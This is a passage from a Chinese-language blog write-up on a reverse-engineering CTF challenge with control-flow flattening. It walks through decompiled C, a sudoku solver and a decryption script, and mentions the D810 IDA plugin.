class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">trace</span><span class="params">(__int64 a1, <span class="type">int</span> *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r8d</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+78h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+7Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+80h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+84h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+88h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">671940414</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">while</span> ( v13 == <span class="number">-2124394493</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  v4 = <span class="number">338033522</span>;</span><br><span class="line">                  <span class="keyword">if</span> ( v17 &lt; <span class="number">9</span> )</span><br><span class="line">                    v4 = <span class="number">-1264962160</span>;</span><br><span class="line">                  v13 = v4;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> ( v13 != <span class="number">-2084617164</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                ++a3;</span><br><span class="line">                v17 = a2[<span class="number">12</span> * v14];</span><br><span class="line">                v16 = a2[<span class="number">12</span> * v14 + <span class="number">1</span>];</span><br><span class="line">                v13 = <span class="number">295419890</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( v13 != <span class="number">-2069701336</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              v5 = <span class="number">942378879</span>;</span><br><span class="line">              <span class="keyword">if</span> ( v16 &lt; <span class="number">9</span> )</span><br><span class="line">                v5 = <span class="number">1672958513</span>;</span><br><span class="line">              v13 = v5;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v13 != <span class="number">-1561315505</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v13 = <span class="number">2016120547</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v13 != <span class="number">-1361654796</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++v16;</span><br><span class="line">          v13 = <span class="number">-2069701336</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v13 != <span class="number">-1289862082</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v13 = <span class="number">-1361654796</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v13 != <span class="number">-1264962160</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v16 = <span class="number">0</span>;</span><br><span class="line">      v13 = <span class="number">-2069701336</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v13 == <span class="number">-1246113443</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-446534017</span>:</span><br><span class="line">        v9 = <span class="number">1764791757</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !a2[<span class="number">12</span> * v14 + <span class="number">2</span>] )</span><br><span class="line">          v9 = <span class="number">1923573299</span>;</span><br><span class="line">        v13 = v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-264375465</span>:</span><br><span class="line">        *(_DWORD *)(<span class="number">36LL</span> * a2[<span class="number">12</span> * v14] + a1 + <span class="number">4LL</span> * a2[<span class="number">12</span> * v14 + <span class="number">1</span>]) = <span class="number">0</span>;</span><br><span class="line">        ++a3;</span><br><span class="line">        --v14;</span><br><span class="line">        v13 = <span class="number">-446534017</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-127108152</span>:</span><br><span class="line">        a2[<span class="number">12</span> * v14] = v17;</span><br><span class="line">        a2[<span class="number">12</span> * v14 + <span class="number">1</span>] = v16;</span><br><span class="line">        v7 = findvalue(a1, &amp;a2[<span class="number">12</span> * v14]);</span><br><span class="line">        v8 = <span class="number">295419890</span>;</span><br><span class="line">        *(_DWORD *)(<span class="number">36LL</span> * v17 + a1 + <span class="number">4LL</span> * v16) = v7;</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)(<span class="number">36LL</span> * v17 + a1 + <span class="number">4LL</span> * v16) == <span class="number">-1</span> )</span><br><span class="line">          v8 = <span class="number">1601744610</span>;</span><br><span class="line">        v13 = v8;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">67917660</span>:</span><br><span class="line">        *(_DWORD *)(<span class="number">36LL</span> * a2[<span class="number">12</span> * v14] + a1 + <span class="number">4LL</span> * a2[<span class="number">12</span> * v14 + <span class="number">1</span>]) = v15;</span><br><span class="line">        a2[<span class="number">12</span> * v14 + <span class="number">2</span> + v15] = <span class="number">1</span>;</span><br><span class="line">        --a2[<span class="number">12</span> * v14 + <span class="number">2</span>];</span><br><span class="line">        v13 = <span class="number">-2084617164</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">295419890</span>:</span><br><span class="line">        ++v14;</span><br><span class="line">        a3 = a3 - <span class="number">1146223301</span> + <span class="number">1146223300</span>;</span><br><span class="line">        v13 = <span class="number">-1289862082</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">338033522</span>:</span><br><span class="line">        v13 = <span class="number">671940414</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">376448068</span>:</span><br><span class="line">        v17 = <span class="number">0</span>;</span><br><span class="line">        v13 = <span class="number">-2124394493</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">599244415</span>:</span><br><span class="line">        v11 = <span class="number">-2084617164</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v15 &lt; <span class="number">10</span> )</span><br><span class="line">          v11 = <span class="number">1332608024</span>;</span><br><span class="line">        v13 = v11;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">671940414</span>:</span><br><span class="line">        v3 = <span class="number">-1246113443</span>;</span><br><span class="line">        <span class="keyword">if</span> ( a3 )</span><br><span class="line">          v3 = <span class="number">376448068</span>;</span><br><span class="line">        v13 = v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">942378879</span>:</span><br><span class="line">        v13 = <span class="number">1396614849</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1332608024</span>:</span><br><span class="line">        v12 = <span class="number">-1561315505</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !a2[<span class="number">12</span> * v14 + <span class="number">2</span> + v15] )</span><br><span class="line">          v12 = <span class="number">67917660</span>;</span><br><span class="line">        v13 = v12;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1396614849</span>:</span><br><span class="line">        ++v17;</span><br><span class="line">        v13 = <span class="number">-2124394493</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1601744610</span>:</span><br><span class="line">        *(_DWORD *)(<span class="number">36LL</span> * v17 + a1 + <span class="number">4LL</span> * v16) = <span class="number">0</span>;</span><br><span class="line">        --v14;</span><br><span class="line">        v13 = <span class="number">-446534017</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1672958513</span>:</span><br><span class="line">        v6 = <span class="number">-1289862082</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">36LL</span> * v17 + a1 + <span class="number">4LL</span> * v16) )</span><br><span class="line">          v6 = <span class="number">-127108152</span>;</span><br><span class="line">        v13 = v6;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1751405620</span>:</span><br><span class="line">        <span class="built_in">printf</span>(aGameOver);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1764791757</span>:</span><br><span class="line">        v15 = <span class="number">1</span>;</span><br><span class="line">        v13 = <span class="number">599244415</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1923573299</span>:</span><br><span class="line">        v10 = <span class="number">-264375465</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v14 )</span><br><span class="line">          v10 = <span class="number">1751405620</span>;</span><br><span class="line">        v13 = v10;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        ++v15;</span><br><span class="line">        v13 = <span class="number">599244415</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>check1</p>
<ul>
<li><strong>前半部分与后半部分交换</strong></li>
<li><strong>每对相邻字符交换</strong></li>
<li><strong>位操作和算术变换</strong></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">check1</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+6Eh] [rbp-12h]</span></span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [rsp+6Fh] [rbp-11h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+70h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+74h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+74h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+74h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="built_in">strlen</span>(a1) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1) &gt;&gt; <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = a1[v5];</span><br><span class="line">    a1[v5] = a1[i];</span><br><span class="line">    a1[i] = v3;</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(a1); j += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = a1[j];</span><br><span class="line">    a1[j] = a1[j + <span class="number">1</span>];</span><br><span class="line">    a1[j + <span class="number">1</span>] = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; ; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="keyword">if</span> ( k &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a1[k] = (a1[k] &amp; <span class="number">0xF3</span> | ~a1[k] &amp; <span class="number">0xC</span>) - <span class="number">20</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>check3就是个验证函数</p>
<p>check2检查输入字符串是否能正确填充一个数独网格</p>
<p>提取数独</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">5</span> <span class="number">3</span> <span class="number">2</span> <span class="number">7</span> <span class="number">0</span> <span class="number">0</span> <span class="number">8</span></span><br><span class="line"><span class="number">8</span> <span class="number">0</span> <span class="number">9</span> <span class="number">0</span> <span class="number">5</span> <span class="number">0</span> <span class="number">0</span> <span class="number">2</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">7</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">5</span> <span class="number">0</span> <span class="number">3</span></span><br><span class="line"><span class="number">4</span> <span class="number">9</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">3</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">7</span> <span class="number">0</span> <span class="number">9</span> <span class="number">0</span> <span class="number">6</span></span><br><span class="line"><span class="number">7</span> <span class="number">0</span> <span class="number">3</span> <span class="number">2</span> <span class="number">9</span> <span class="number">0</span> <span class="number">4</span> <span class="number">8</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">6</span> <span class="number">0</span> <span class="number">5</span> <span class="number">4</span> <span class="number">0</span> <span class="number">8</span> <span class="number">0</span> <span class="number">9</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">4</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">3</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">2</span> <span class="number">1</span> <span class="number">0</span> <span class="number">3</span> <span class="number">0</span> <span class="number">7</span> <span class="number">0</span> <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>求解数独</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid</span>(<span class="params">board, row, col, num</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> board[row][j] == num:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> board[i][col] == num:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    start_row, start_col = <span class="number">3</span> * (row // <span class="number">3</span>), <span class="number">3</span> * (col // <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_row, start_row + <span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(start_col, start_col + <span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> board[i][j] == num:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">board, steps</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> board[i][j] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">                    <span class="keyword">if</span> is_valid(board, i, j, num):</span><br><span class="line">                        board[i][j] = num</span><br><span class="line">                        steps.append(num)</span><br><span class="line">                        <span class="keyword">if</span> solve(board, steps):</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                        board[i][j] = <span class="number">0</span></span><br><span class="line">                        steps.pop()</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入数独（0 表示空格）</span></span><br><span class="line">sudoku = [</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">8</span>],</span><br><span class="line">    [<span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">3</span>],</span><br><span class="line">    [<span class="number">4</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">6</span>],</span><br><span class="line">    [<span class="number">7</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">steps = []</span><br><span class="line">solve(sudoku, steps)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, steps)))</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">build_reverse_map</span><span class="params">()</span>:</span><br><span class="line">    mp = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> orig in <span class="title function_">range</span><span class="params">(<span class="number">256</span>)</span>:</span><br><span class="line">        trans = (orig &amp; <span class="number">0xF3</span>) | (~orig &amp; <span class="number">0xC</span>)</span><br><span class="line">        enc = (trans - <span class="number">20</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        mp[enc] = orig</span><br><span class="line">    <span class="keyword">return</span> mp</span><br><span class="line"></span><br><span class="line">rev_map = build_reverse_map()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decrypt(ciphertext: str) -&gt; str:</span><br><span class="line">    # 转成字节数组（这里输入是字符串形式的数字，需要转成字符列表）</span><br><span class="line">    data = <span class="built_in">list</span>(ciphertext)</span><br><span class="line">    n = len(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 密文实际是 ASCII 编码后的字符，而不是数字字符串</span><br><span class="line">    raw = [ord(c) <span class="keyword">for</span> c in ciphertext]</span><br><span class="line"></span><br><span class="line">    dec_bytes = []</span><br><span class="line">    <span class="keyword">for</span> b in raw:</span><br><span class="line">        <span class="keyword">if</span> b not in rev_map:</span><br><span class="line">            raise ValueError(f<span class="string">&quot;无法解码字节: &#123;b&#125;&quot;</span>)</span><br><span class="line">        dec_bytes.append(rev_map[b])</span><br><span class="line"></span><br><span class="line">    # 逆 step2: 相邻交换</span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">0</span>, n, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> j+<span class="number">1</span> &lt; n:</span><br><span class="line">            dec_bytes[j], dec_bytes[j+<span class="number">1</span>] = dec_bytes[j+<span class="number">1</span>], dec_bytes[j]</span><br><span class="line"></span><br><span class="line">    # 逆 step1: 半段交换</span><br><span class="line">    half = n <span class="comment">// 2</span></span><br><span class="line">    <span class="keyword">for</span> i in range(half):</span><br><span class="line">        dec_bytes[i], dec_bytes[i+half] = dec_bytes[i+half], dec_bytes[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes(dec_bytes).decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    cipher = <span class="string">&quot;4693641762894685722843556137219876255986&quot;</span></span><br><span class="line">    print(decrypt(cipher))</span><br><span class="line">## KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J</span><br></pre></td></tr></table></figure>



<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>D810去平坦化插件使用</p>
<p><a target="_blank" rel="noopener" href="https://gitlab.com/eshard/d810">插件</a></p>
<p>把文件夹和.py复制到IDA目录的plugin下即可</p>
<p><img src="/2025/09/09/%E5%8E%BB%E9%99%A4%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/d108.png" alt="1"></p>
<p>效果很好。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/09/03/vm%E9%80%86%E5%90%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/09/03/vm%E9%80%86%E5%90%91/" class="post-title-link" itemprop="url">vm逆向</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-09-03 17:35:10" itemprop="dateCreated datePublished" datetime="2025-09-03T17:35:10+08:00">2025-09-03</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:09:31" itemprop="dateModified" datetime="2025-09-23T21:09:31+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
                </span>
                  ，
